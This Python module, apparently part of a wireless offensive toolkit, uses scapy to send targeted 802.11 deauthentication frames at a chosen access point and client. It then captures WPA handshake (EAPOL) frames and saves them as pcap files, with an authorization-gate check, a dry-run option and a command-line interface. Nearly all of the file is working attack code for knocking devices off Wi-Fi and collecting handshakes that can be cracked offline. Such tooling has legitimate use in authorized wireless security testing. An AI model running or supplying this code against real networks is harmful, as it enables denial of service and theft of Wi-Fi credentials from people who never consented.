"""Tier A targeted RF offense (Pi/Alfa): single-target deauth + WPA handshake
capture. EVERY action is authorized through kuma_core.authz.Gate before any
frame is built or sent. Transmission/sniffing are injected so this is unit-
testable without hardware and supports a --no-tx dry run. Untargeted floods are
Tier B (separate module) -- not here.
"""
from __future__ import annotations

from dataclasses import dataclass

from scapy.all import Dot11, Dot11Deauth, RadioTap, wrpcap  # type: ignore

from kuma_core import kuroshuna_stats

BROADCAST = "ff:ff:ff:ff:ff:ff"
DEFAULT_COUNT = 64           # deauth bursts per call (Tier A targeted, modest)
DEFAULT_REASON = 7           # 802.11 reason 7: class-3 frame from nonassociated STA


@dataclass
class RFResult:
    ok: bool
    reason: str
    frames_sent: int
    dry_run: bool = False
    detail: str = ""
    frames_captured: int = 0   # FIX 3: EAPOL frames received (capture path only)


def build_deauth_frames(bssid: str, client: str = BROADCAST, reason: int = 7):
    """Build deauth frame(s). For a specific client, both directions (AP->client
    and client->AP) so either endpoint drops the link. For broadcast, AP->all."""
    ap_to_client = (RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid)
                    / Dot11Deauth(reason=reason))
    if client.lower() == BROADCAST:
        return [ap_to_client]
    client_to_ap = (RadioTap() / Dot11(addr1=bssid, addr2=client, addr3=bssid)
                    / Dot11Deauth(reason=reason))
    return [ap_to_client, client_to_ap]


def _scapy_sendp(frames, iface, count):
    from scapy.all import sendp  # type: ignore
    sendp(frames, iface=iface, count=count, inter=0.1, verbose=False)


def _scapy_set_channel(iface, channel):
    import subprocess
    subprocess.run(["iw", "dev", iface, "set", "channel", str(channel)], check=False)


def _scapy_sniff(iface, bssid, timeout):
    """Capture EAPOL frames for one BSSID on the current channel.

    NOTE: time.sleep(timeout) blocks the calling thread for up to `timeout`
    seconds. Async orchestration should inject its own sniffer or use a short
    timeout rather than relying on this default implementation."""
    from scapy.all import AsyncSniffer, Dot11, EAPOL  # type: ignore
    b = bssid.lower()

    def _match(pkt):
        if not pkt.haslayer(EAPOL) or not pkt.haslayer(Dot11):
            return False
        addrs = {(pkt[Dot11].addr1 or "").lower(),
                 (pkt[Dot11].addr2 or "").lower(),
                 (pkt[Dot11].addr3 or "").lower()}
        return b in addrs

    sn = AsyncSniffer(iface=iface, lfilter=_match)
    sn.start()
    import time
    time.sleep(timeout)  # blocks calling thread; see docstring above
    return sn.stop() or []


class TargetedRF:
    """Gated targeted RF actions. All hardware touchpoints are injected so this
    is testable without a radio and supports dry runs."""

    def __init__(self, gate, iface: str | None = None, *, sender=None,
                 set_channel=None, sniffer=None, dry_run: bool = False) -> None:
        from kuma_core.config import settings
        self.gate = gate
        self.iface = iface or settings.monitor_interface
        self._sender = sender or _scapy_sendp
        self._set_channel = set_channel
        self._sniffer = sniffer
        # WARNING: flipping dry_run to False post-construction arms the radio.
        # Callers should construct with the intended mode and not mutate this field.
        self.dry_run = dry_run

    def deauth(self, bssid: str, client: str = BROADCAST,
               count: int = DEFAULT_COUNT, reason: int = DEFAULT_REASON) -> RFResult:
        # The authorization target is the BSSID (the network we act on).
        allowed, why = self.gate.is_authorized(bssid, "deauth")
        if not allowed:
            return RFResult(ok=False, reason=why, frames_sent=0)
        frames = build_deauth_frames(bssid, client, reason)
        if self.dry_run:
            return RFResult(ok=True, reason="dry-run (no tx)", frames_sent=0,
                            dry_run=True,
                            detail=f"would send {len(frames)}x{count} to {bssid}/{client}")
        try:
            self._sender(frames, self.iface, count)
        except Exception as e:
            return RFResult(ok=False, reason=f"tx error: {e}", frames_sent=0,
                            detail="sender failed")
        try:
            kuroshuna_stats.record_tx(len(frames) * count)
        except Exception:
            pass
        return RFResult(ok=True, reason=why, frames_sent=len(frames) * count,
                        detail=f"deauth {bssid} <-> {client}")

    def capture_handshake(self, bssid: str, channel: int, timeout: int = 30,
                          out_dir=None) -> RFResult:
        from kuma_core.config import DATA_DIR
        allowed, why = self.gate.is_authorized(bssid, "capture")
        if not allowed:
            return RFResult(ok=False, reason=why, frames_sent=0)
        set_ch = self._set_channel or _scapy_set_channel
        sniff = self._sniffer or _scapy_sniff
        if self.dry_run:
            return RFResult(ok=True, reason="dry-run (no tx)", frames_sent=0,
                            dry_run=True, detail=f"would capture {bssid} ch{channel}")
        try:
            set_ch(self.iface, channel)
            pkts = sniff(self.iface, bssid, timeout)
            if not pkts:
                return RFResult(ok=True, reason="no EAPOL captured", frames_sent=0,
                                frames_captured=0)
            out = out_dir or (DATA_DIR / "handshakes")
            from pathlib import Path
            out = Path(out)
            out.mkdir(parents=True, exist_ok=True)
            from kuma_core.events import utcnow_iso
            stamp = utcnow_iso().replace(":", "").replace("-", "")
            path = out / f"{bssid.replace(':', '').upper()}-{stamp}.pcap"
            wrpcap(str(path), pkts)
        except Exception as e:
            return RFResult(ok=False, reason=f"capture error: {e}", frames_sent=0,
                            detail="hardware/io failed")
        try:
            kuroshuna_stats.record_pwn(bssid)
        except Exception:
            pass
        return RFResult(ok=True, reason=why, frames_sent=0,
                        frames_captured=len(pkts),
                        detail=f"captured {len(pkts)} EAPOL -> {path.name}")


def build_args(argv):
    import argparse
    p = argparse.ArgumentParser(
        prog="offense.rf_targeted",
        description="Kuroshuna Tier A targeted RF: gated deauth + handshake capture.")
    p.add_argument("--bssid", required=True, help="target BSSID (must be authorized)")
    p.add_argument("--client", default=BROADCAST, help="target station (default: broadcast)")
    p.add_argument("--deauth", action="store_true", help="send targeted deauth")
    p.add_argument("--capture", action="store_true", help="capture WPA handshake")
    p.add_argument("--channel", type=int, default=6)
    p.add_argument("--count", type=int, default=DEFAULT_COUNT)
    p.add_argument("--timeout", type=int, default=30)
    p.add_argument("--iface", default=None)
    p.add_argument("--no-tx", dest="no_tx", action="store_true",
                   help="dry run: build/authorize but never transmit")
    return p.parse_args(argv)


def run_cli(args, rf=None) -> int:
    if not args.deauth and not args.capture:
        print("error: specify --deauth and/or --capture", flush=True)
        return 2
    if rf is None:
        from kuma_core.authz import Gate
        rf = TargetedRF(gate=Gate(), iface=args.iface, dry_run=args.no_tx)
    rc = 0
    if args.deauth:
        res = rf.deauth(args.bssid, client=args.client, count=args.count)
        print(f"[deauth] ok={res.ok} {res.reason} frames={res.frames_sent} "
              f"{res.detail}", flush=True)
        rc = rc or (0 if res.ok else 1)
    if args.capture:
        res = rf.capture_handshake(args.bssid, channel=args.channel,
                                   timeout=args.timeout)
        print(f"[capture] ok={res.ok} {res.reason} captured={res.frames_captured} "
              f"{res.detail}", flush=True)
        rc = rc or (0 if res.ok else 1)
    return rc


if __name__ == "__main__":  # pragma: no cover
    import sys
    sys.exit(run_cli(build_args(sys.argv[1:])))
